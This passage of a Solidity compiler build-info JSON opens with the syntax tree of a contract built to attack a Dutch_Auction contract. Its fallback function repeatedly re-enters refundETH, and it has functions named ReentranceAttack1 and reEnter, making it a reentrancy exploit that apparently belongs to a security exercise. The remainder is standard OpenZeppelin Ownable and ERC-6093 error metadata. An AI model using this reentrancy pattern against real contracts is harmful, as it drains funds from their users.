payable"}},"src":"280:17:9","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":2040,"nodeType":"ExpressionStatement","src":"280:17:9"}]},"id":2042,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":2029,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2028,"mutability":"mutable","name":"_target","nameLocation":"213:7:9","nodeType":"VariableDeclaration","scope":2042,"src":"197:23:9","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address payable"},"typeName":{"id":2027,"name":"address","nodeType":"ElementaryTypeName","src":"197:15:9","stateMutability":"payable","typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address payable"}},"visibility":"internal"}],"src":"196:25:9"},"returnParameters":{"id":2030,"nodeType":"ParameterList","parameters":[],"src":"229:0:9"},"scope":2081,"src":"185:119:9","stateMutability":"payable","virtual":false,"visibility":"public"},{"body":{"id":2059,"nodeType":"Block","src":"338:82:9","statements":[{"body":{"id":2057,"nodeType":"Block","src":"384:30:9","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":2052,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2024,"src":"394:6:9","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}},"id":2054,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"401:9:9","memberName":"refundETH","nodeType":"MemberAccess","referencedDeclaration":1589,"src":"394:16:9","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":2055,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"394:18:9","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2056,"nodeType":"ExpressionStatement","src":"394:18:9"}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2051,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"arguments":[{"id":2047,"name":"targetA","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2026,"src":"362:7:9","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":2046,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"354:7:9","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":2045,"name":"address","nodeType":"ElementaryTypeName","src":"354:7:9","typeDescriptions":{}}},"id":2048,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"354:16:9","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":2049,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"371:7:9","memberName":"balance","nodeType":"MemberAccess","src":"354:24:9","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"31303030","id":2050,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"379:4:9","typeDescriptions":{"typeIdentifier":"t_rational_1000_by_1","typeString":"int_const 1000"},"value":"1000"},"src":"354:29:9","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2058,"nodeType":"WhileStatement","src":"348:66:9"}]},"id":2060,"implemented":true,"kind":"fallback","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":2043,"nodeType":"ParameterList","parameters":[],"src":"318:2:9"},"returnParameters":{"id":2044,"nodeType":"ParameterList","parameters":[],"src":"338:0:9"},"scope":2081,"src":"310:110:9","stateMutability":"payable","virtual":false,"visibility":"external"},{"body":{"id":2070,"nodeType":"Block","src":"461:67:9","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"argumentTypes":[],"expression":{"id":2063,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2024,"src":"471:6:9","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}},"id":2065,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"478:9:9","memberName":"addBidder","nodeType":"MemberAccess","referencedDeclaration":1377,"src":"471:16:9","typeDescriptions":{"typeIdentifier":"t_function_external_payable$__$returns$__$","typeString":"function () payable external"}},"id":2067,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"names":["value"],"nodeType":"FunctionCallOptions","options":[{"hexValue":"302e303030303030303030303030303033","id":2066,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"495:23:9","subdenomination":"ether","typeDescriptions":{"typeIdentifier":"t_rational_3000_by_1","typeString":"int_const 3000"},"value":"0.000000000000003"}],"src":"471:48:9","typeDescriptions":{"typeIdentifier":"t_function_external_payable$__$returns$__$value","typeString":"function () payable external"}},"id":2068,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"471:50:9","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2069,"nodeType":"ExpressionStatement","src":"471:50:9"}]},"functionSelector":"fcd36e9c","id":2071,"implemented":true,"kind":"function","modifiers":[],"name":"ReentranceAttack1","nameLocation":"435:17:9","nodeType":"FunctionDefinition","parameters":{"id":2061,"nodeType":"ParameterList","parameters":[],"src":"452:2:9"},"returnParameters":{"id":2062,"nodeType":"ParameterList","parameters":[],"src":"461:0:9"},"scope":2081,"src":"426:102:9","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":2079,"nodeType":"Block","src":"560:35:9","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":2074,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2024,"src":"570:6:9","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}},"id":2076,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"577:9:9","memberName":"refundETH","nodeType":"MemberAccess","referencedDeclaration":1589,"src":"570:16:9","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":2077,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"570:18:9","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2078,"nodeType":"ExpressionStatement","src":"570:18:9"}]},"functionSelector":"0ec39463","id":2080,"implemented":true,"kind":"function","modifiers":[],"name":"reEnter","nameLocation":"543:7:9","nodeType":"FunctionDefinition","parameters":{"id":2072,"nodeType":"ParameterList","parameters":[],"src":"550:2:9"},"returnParameters":{"id":2073,"nodeType":"ParameterList","parameters":[],"src":"560:0:9"},"scope":2081,"src":"534:61:9","stateMutability":"nonpayable","virtual":false,"visibility":"public"}],"scope":2082,"src":"105:529:9","usedErrors":[],"usedEvents":[]}],"src":"48:586:9"},"id":9}},"contracts":{"@openzeppelin/contracts/access/Ownable.sol":{"Ownable":{"abi":[{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"OwnableInvalidOwner","type":"error"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"OwnableUnauthorizedAccount","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"details":"Contract module which provides a basic access control mechanism, where there is an account (an owner) that can be granted exclusive access to specific functions. The initial owner is set to the address provided by the deployer. This can later be changed with {transferOwnership}. This module is used through inheritance. It will make available the modifier `onlyOwner`, which can be applied to your functions to restrict their use to the owner.","errors":{"OwnableInvalidOwner(address)":[{"details":"The owner is not a valid owner account. (eg. `address(0)`)"}],"OwnableUnauthorizedAccount(address)":[{"details":"The caller account is not authorized to perform an operation."}]},"kind":"dev","methods":{"constructor":{"details":"Initializes the contract setting the address provided by the deployer as the initial owner."},"owner()":{"details":"Returns the address of the current owner."},"renounceOwnership()":{"details":"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."},"transferOwnership(address)":{"details":"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."}},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"owner()":"8da5cb5b","renounceOwnership()":"715018a6","transferOwnership(address)":"f2fde38b"}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Contract module which provides a basic access control mechanism, where there is an account (an owner) that can be granted exclusive access to specific functions. The initial owner is set to the address provided by the deployer. This can later be changed with {transferOwnership}. This module is used through inheritance. It will make available the modifier `onlyOwner`, which can be applied to your functions to restrict their use to the owner.\",\"errors\":{\"OwnableInvalidOwner(address)\":[{\"details\":\"The owner is not a valid owner account. (eg. `address(0)`)\"}],\"OwnableUnauthorizedAccount(address)\":[{\"details\":\"The caller account is not authorized to perform an operation.\"}]},\"kind\":\"dev\",\"methods\":{\"constructor\":{\"details\":\"Initializes the contract setting the address provided by the deployer as the initial owner.\"},\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/access/Ownable.sol\":\"Ownable\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0x75a4ee64c68dbd5f38bddd06e664a64c8271b4caa554fb6f0607dfd672bb4bf3\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":8,"contract":"@openzeppelin/contracts/access/Ownable.sol:Ownable","label":"_owner","offset":0,"slot":"0","type":"t_address"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/interfaces/draft-IERC6093.sol":{"IERC1155Errors":{"abi":[{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ERC1155InsufficientBalance","type":"error"},{"inputs":[{"internalType":"address","name":"approver","type":"address"}],"name":"ERC1155InvalidApprover","type":"error"},{"inputs":[{"internalType":"uint256","name":"idsLength","type":"uint256"},{"internalType":"uint256","name":"valuesLength","type":"uint256"}],"name":"ERC1155InvalidArrayLength","type":"error"},{"inputs":[{"internalType":"address","name":"operator","type":"address"}],"name":"ERC1155InvalidOperator","type":"error"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"}],"name":"ERC1155InvalidReceiver","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ERC1155InvalidSender","type":"error"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"address","name":"owner","type":"address"}],"name":"ERC1155MissingApprovalForAll","type":"error"}],"devdoc":{"details":"Standard ERC1155 Errors Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.","errors":{"ERC1155InsufficientBalance(address,uint256,uint256,uint256)":[{"details":"Indicates an error related to the current `balance` of a `sender`. Used in transfers.","params":{"balance":"Current balance for the interacting account.","needed":"Minimum amount required to perform a transfer.","sender":"Address whose tokens are being transferred.","tokenId":"Identifier number of a token."}}],"ERC1155InvalidApprover(address)":[{"details":"Indicates a failure with the `approver` of a token to be approved. Used in approvals.","params":{"approver":"Address initiating an approval operation."}}],"ERC1155InvalidArrayLength(uint256,uint256)":[{"details":"Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation. Used in batch transfers.","params":{"idsLength":"Length of the array of token identifiers","valuesLength":"Length of the array of token amounts"}}],"ERC1155InvalidOperator(address)":[{"details":"Indicates a failure with the `operator` to be approved. Used in approvals.","params":{"operator":"Address that may be allowed to operate on tokens without being their owner."}}],"ERC1155InvalidReceiver(address)":[{"details":"Indicates a failure with the token `receiver`. Used in transfers.","params":{"receiver":"Address to which tokens are being transferred."}}],"ERC1155InvalidSender(address)":[{"details":"Indicates a failure with the token `sender`. Used in transfers.","params":{"sender":"Address whose tokens are being transferred."}}],"ERC1155MissingApprovalForAll(address,address)":[{"details":"Indicates a failure with the `operator`’s approval. Used in transfers.","params":{"operator":"Address that may be allowed to operate on tokens without being their owner.","owner":"Address of the current owner of a token."}}]},"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ERC1155InsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ERC1155InvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"idsLength\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"valuesLength\",\"type\":\"uint256\"}],\"name\":\"ERC1155InvalidArrayLength\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"}],\"name\":\"ERC1155InvalidOperator\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ERC1155InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ERC1155InvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"ERC1155MissingApprovalForAll\",\"type\":\"error\"}],\"devdoc\":{\"details\":\"Standard ERC1155 Errors Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\",\"errors\":{\"ERC1155InsufficientBalance(address,uint256,uint256,uint256)\":[{\"details\":\"Indicates an error related to the current `balance` of a `sender`. Used in transfers.\",\"params\":{\"balance\":\"Current balance for the interacting account.\",\"needed\":\"Minimum amount required to perform a transfer.\",\"sender\":\"Address whose tokens are being transferred.\",\"tokenId\":\"Identifier number of a token.\"}}],\"ERC1155InvalidApprover(address)\":[{\"details\":\"Indicates a failure with the `approver` of a token to be approved. Used in approvals.\",\"params\":{\"approver\":\"Address initiating an approval operation.\"}}],\"ERC1155InvalidArrayLength(uint256,uint256)\":[{\"details\":\"Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation. Used in batch transfers.\",\"params\":{\"idsLength\":\"Length of the array of token identifiers\",\"valuesLength\":\"Length of the array of token amounts\"}}],\"ERC1155InvalidOperator(address)\":[{\"details\":\"Indicates a failure with the `operator` to be approved. Used in approvals.\",\"params\":{\"operator\":\"Address that may be allowed to operate on tokens without being their owner.\"}}],\"ERC1155InvalidReceiver(address)\":[{\"details\":\"Indicates a failure with the token `receiver`. Used in transfers.\",\"params\":{\"receiver\":\"Address to which tokens are being transferred.\"}}],\"ERC1155InvalidSender(address)\":[{\"details\":\"Indicates a failure with the token `sender`. Used in transfers.\",\"params\":{\"sender\":\"Address whose tokens are being transferred.\"}}],\"ERC1155MissingApprovalForAll(address,address)\":[{\"details\":\"Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\",\"params\":{\"operator\":\"Address that may be allowed to operate on tokens without being their owner.\",\"owner\":\"Address of the current owner of a token.\"}}]},\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":\"IERC1155Errors\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Standard ERC20 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\\n */\\ninterface IERC20Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC20InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC20InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC20InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC20InvalidSpender(address spender);\\n}\\n\\n/**\\n * @dev Standard ERC721 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\\n */\\ninterface IERC721Errors {\\n    /**\\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\\n     * Used in balance queries.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721InvalidOwner(address owner);\\n\\n    /**\\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721NonexistentToken(uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param tokenId Identifier number of a token.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC721InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC721InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC721InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC721InvalidOperator(address operator);\\n}\\n\\n/**\\n * @dev Standard ERC1155 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\\n */\\ninterface IERC1155Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC1155InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC1155InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC1155MissingApprovalForAll(address operator, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC1155InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC1155InvalidOperator(address operator);\\n\\n    /**\\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\\n     * Used in batch transfers.\\n     * @param idsLength Length of the array of token identifiers\\n     * @param valuesLength Length of the array of token amounts\\n     */\\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\\n}\\n\",\"keccak256\":\"0x60c65f701957fdd6faea1acb0bb45825791d473693ed9ecb34726fdfaa849dd7\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}},"IERC20Errors":{"abi":[{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"allowance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientAllowance","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientBalance","type":"error"},{"inputs":[{"internalType":"address","name":"approver","type":"address"}],"name":"ERC20InvalidApprover","type":"error"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"}],"name":"ERC20InvalidReceiver","type":"error"},{"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ERC20InvalidSender","type":"error"},{"inputs":[{"internalType":"address","name":"spender","type":"address"}],"name":"ERC20InvalidSpender","type":"error"}],"devdoc":{"deta